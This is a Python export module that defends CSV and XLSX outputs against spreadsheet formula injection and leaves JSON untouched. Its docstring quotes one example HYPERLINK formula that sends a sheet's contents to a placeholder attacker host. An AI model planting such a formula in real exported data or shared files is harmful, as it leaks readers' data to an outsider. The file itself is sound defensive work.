"""Result export. Formula injection is neutralised per format (F-VIZ-04).

An exported cell beginning ``=``, ``+``, ``-``, ``@`` or a control character is a
formula to Excel and Google Sheets, so `=HYPERLINK("http://attacker/?"&A1,"total")`
exfiltrates a sheet's own contents to whoever opens it. Projects and dashboards are
shared (SCN-084) and analytics rows come from a vendor, so the row can be planted by one
person and opened by another.

The treatment differs per format, and the difference is measured rather than assumed:

* **XLSX** has types. ``openpyxl`` writes a ``=``-leading string as ``data_type='f'`` —
  an actual formula — while ``+``, ``-`` and ``@`` come out as strings. Forcing the cell
  to text removes execution and keeps the value **byte for byte**.
* **CSV** has no types; the consumer's import parser decides, and Excel's evaluates all
  of ``= + - @`` plus a leading tab or carriage return. The only defence is to change the
  value, so a single quote is prefixed — Excel renders it as text and drops the quote.
  That cost is real, which is exactly why it is not applied to XLSX.
* **JSON** has no formula semantics. Altering it would corrupt data for every consumer
  in order to protect none, so it is left alone.
"""

import csv
import io
import json

from openpyxl import Workbook

from app.connectors.base import QueryResult
from app.viz.utils import serialize_value

#: Leading characters Excel and Sheets treat as the start of a formula when importing
#: text. The control characters matter because a leading tab or CR is stripped during
#: import, exposing whatever follows it.
_FORMULA_LEAD = ("=", "+", "-", "@", "\t", "\r", "\n")


def _is_number(value: str) -> bool:
    """True for a plain numeric literal, including a negative or a thousands-grouped one."""
    try:
        float(value.replace(",", "").replace(" ", ""))
    except ValueError:
        return False
    return True


def _csv_safe(value: object) -> object:
    """Prefix a formula-shaped cell so a CSV consumer renders it as text.

    Two exemptions, and both are load-bearing rather than tidy:

    * **A number is never touched.** ``-`` is a formula-lead character, so a naive rule
      prefixes every negative number — ``-1500.00`` becomes ``\'-1500.00`` — and a
      financial export breaks for every downstream consumer. That would be a worse bug
      than the one being fixed, and it is the shape a blanket OWASP character list leads
      you into.
    * **A single character cannot be a formula.** ``-`` alone is a common "no value"
      placeholder and ``=`` alone computes nothing, so neither is worth the fidelity cost.
    """
    # `serialize_value` returns whatever the driver gave — int, Decimal, date, str — so
    # only a string can carry a formula, and only a string has `startswith`. Coercing
    # everything to str here would change how numbers and dates land in the file.
    if (
        isinstance(value, str)
        and len(value) > 1
        and value.startswith(_FORMULA_LEAD)
        and not _is_number(value)
    ):
        return "'" + value
    return value


def export_csv(result: QueryResult) -> str:
    output = io.StringIO()
    writer = csv.writer(output)
    # Column names come from the query, so a header is as attacker-shaped as a cell.
    writer.writerow([_csv_safe(str(c)) for c in result.columns])
    for row in result.rows:
        writer.writerow([_csv_safe(serialize_value(v)) for v in row])
    return output.getvalue()


def export_json(result: QueryResult) -> str:
    data = []
    for row in result.rows:
        data.append({col: serialize_value(v) for col, v in zip(result.columns, row)})
    return json.dumps(data, indent=2, default=str)


def _append_as_text(ws, values: list) -> None:
    """Append a row, forcing every string cell to text rather than formula.

    ``ws.append`` lets openpyxl guess, and it guesses "formula" for a leading ``=``.
    Setting ``data_type`` after the fact is what keeps the value intact while removing
    execution — prefixing, as CSV must do, would change data this format can preserve.
    """
    ws.append(values)
    for cell in ws[ws.max_row]:
        if isinstance(cell.value, str):
            cell.data_type = "s"


def export_xlsx(result: QueryResult) -> bytes:
    wb = Workbook()
    ws = wb.active
    ws.title = "Query Results"

    _append_as_text(ws, [str(c) for c in result.columns])
    for row in result.rows:
        _append_as_text(ws, [serialize_value(v) for v in row])

    output = io.BytesIO()
    wb.save(output)
    return output.getvalue()
